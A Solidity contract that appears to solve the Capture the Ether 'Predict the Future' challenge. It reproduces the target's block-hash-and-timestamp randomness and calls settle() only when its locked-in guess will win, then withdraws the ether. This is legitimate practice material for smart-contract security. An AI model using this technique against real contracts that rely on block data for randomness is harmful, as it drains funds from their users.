//SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface PredictTheFutureChallenge {
    function isComplete() external returns (bool);

    function lockInGuess(uint8) external payable;

    function settle() external;
}

contract PredictTheFutureChallengeCall {
    //uint8 public answer;
    uint8 public lucknumber = 3;
    address public owner;
    PredictTheFutureChallenge public _interface;

    constructor(address addr) {
        require(addr != address(0), "Address can not be Zero");
        _interface = PredictTheFutureChallenge(addr);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "you are not owner!");
        _;
    }

    //function callFuct(address addr) public payable {
    function callLockInGuess() public payable {
        _interface.lockInGuess{value: 1 ether}(lucknumber);
    }

    function callsettle() public {
        require(
            lucknumber ==
                (uint8(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                blockhash(block.number - 1),
                                block.timestamp
                            )
                        )
                    )
                ) % 10),
            "lucknum not right, try latter.."
        );
        _interface.settle();
    }

    function withdraw(address payable _to) public payable onlyOwner {
        _to.transfer(address(this).balance);
    }

    function deposit() public payable {}

    //合约为了能接eth, 需要此函数
    receive() external payable {}
}
